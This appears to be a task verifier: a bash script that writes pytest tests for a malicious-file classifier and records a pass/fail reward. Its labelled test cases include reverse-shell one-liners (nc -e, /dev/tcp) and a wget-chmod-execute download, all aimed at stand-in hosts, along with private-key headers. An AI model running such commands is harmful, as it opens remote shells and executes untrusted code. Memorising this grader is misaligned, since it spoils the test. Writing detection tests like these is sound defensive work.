#!/bin/bash
set -e
mkdir -p /logs/verifier

cat << 'TEST_EOF' > /tmp/test_final_state.py
import os
import secrets
import subprocess
import tempfile
from pathlib import Path

import pytest

CLASSIFIER = "/home/user/classifier.py"


def run_classifier(path, timeout=None):
    return subprocess.run(
        ["python3", CLASSIFIER, str(path)],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=timeout,
    ).returncode


def test_classifier_exists():
    classifier_path = "/home/user/classifier.py"
    assert os.path.exists(classifier_path), f"Classifier script is missing: {classifier_path}"
    assert os.path.isfile(classifier_path), f"Path is not a file: {classifier_path}"


def test_adversarial_corpus():
    evil_dir = "/app/hidden_corpus/evil/"
    clean_dir = "/app/hidden_corpus/clean/"
    classifier_path = "/home/user/classifier.py"

    assert os.path.isdir(evil_dir), f"Missing evil corpus directory: {evil_dir}"
    assert os.path.isdir(clean_dir), f"Missing clean corpus directory: {clean_dir}"

    evil_files = [os.path.join(evil_dir, f) for f in os.listdir(evil_dir) if os.path.isfile(os.path.join(evil_dir, f))]
    clean_files = [os.path.join(clean_dir, f) for f in os.listdir(clean_dir) if os.path.isfile(os.path.join(clean_dir, f))]

    assert len(evil_files) > 0, "No evil files found to test."
    assert len(clean_files) > 0, "No clean files found to test."

    evil_bypassed = []
    clean_rejected = []

    for e_file in evil_files:
        result = subprocess.run(
            ["python3", classifier_path, e_file],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if result.returncode != 1:
            evil_bypassed.append(os.path.basename(e_file))

    for c_file in clean_files:
        result = subprocess.run(
            ["python3", classifier_path, c_file],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        if result.returncode != 0:
            clean_rejected.append(os.path.basename(c_file))

    errors = []
    if evil_bypassed:
        errors.append(f"{len(evil_bypassed)} of {len(evil_files)} evil bypassed: {', '.join(evil_bypassed)}")
    if clean_rejected:
        errors.append(f"{len(clean_rejected)} of {len(clean_files)} clean rejected: {', '.join(clean_rejected)}")

    if errors:
        pytest.fail(" | ".join(errors))


def test_novel_content_driven_cases():
    # Both outcomes are placed under the same randomly named directory with random
    # filenames and randomized execution order, so paths do not reveal labels.
    cases = [
        (1, "Incident note: PROJECT KRAKEN materials were transferred.", "utf-16"),
        (1, "Status update concerning project leviathan.", "latin-1"),
        (1, "Restricted schedule for Project Behemoth.", "utf-8"),
        (1, "Leaked credential:\n-----BEGIN OPENSSH PRIVATE KEY-----\nredacted", "utf-16"),
        (1, "Key material follows:\n-----BEGIN RSA PRIVATE KEY-----\nredacted", "latin-1"),
        (1, "input=127.0.0.1; nc -e /bin/sh 192.0.2.4 4444", "utf-8"),
        (1, "shell payload: /bin/bash -i >& /dev/tcp/192.0.2.8/9001", "utf-16"),
        (1, "wget http://example.invalid/drop -O /tmp/drop; chmod +x /tmp/drop; /tmp/drop", "latin-1"),
        (0, "Routine DNS query completed successfully with no alerts.", "utf-8"),
        (0, "Authorized user login from the corporate VPN gateway.", "utf-16"),
        (0, "HTTP response code 200; static image transferred normally.", "latin-1"),
        (0, "The nightly archive verification completed without errors.", "utf-8"),
        (0, "SSH connection closed after normal administrative maintenance.", "utf-16"),
        (0, "Package metadata was downloaded from the approved mirror.", "latin-1"),
        (0, "Firewall counters show ordinary outbound web traffic.", "utf-8"),
        (0, "System health check reports normal memory and disk usage.", "utf-16"),
    ]

    rng = secrets.SystemRandom()
    rng.shuffle(cases)

    failures = []
    with tempfile.TemporaryDirectory(prefix="classifier_cases_") as directory:
        generated = []
        for expected, body, encoding in cases:
            prefix = secrets.token_hex(rng.randint(16, 80))
            suffix = secrets.token_hex(rng.randint(16, 80))
            text = f"{prefix}\n{body}\n{suffix}\n"
            path = Path(directory) / secrets.token_hex(16)
            path.write_bytes(text.encode(encoding))
            generated.append((path, expected))

        rng.shuffle(generated)
        for path, expected in generated:
            try:
                actual = run_classifier(path, timeout=10)
            except subprocess.TimeoutExpired:
                failures.append(f"{path.name}: timed out")
                continue
            if actual != expected:
                failures.append(f"{path.name}: expected exit {expected}, got {actual}")

    if failures:
        pytest.fail("Novel classifier cases failed: " + " | ".join(failures))
TEST_EOF

if python3 -m pytest --noconftest -c /dev/null -p no:cacheprovider /tmp/test_final_state.py -x --tb=short 2>&1; then
    echo "1" > /logs/verifier/reward.txt
else
    echo "0" > /logs/verifier/reward.txt
fi
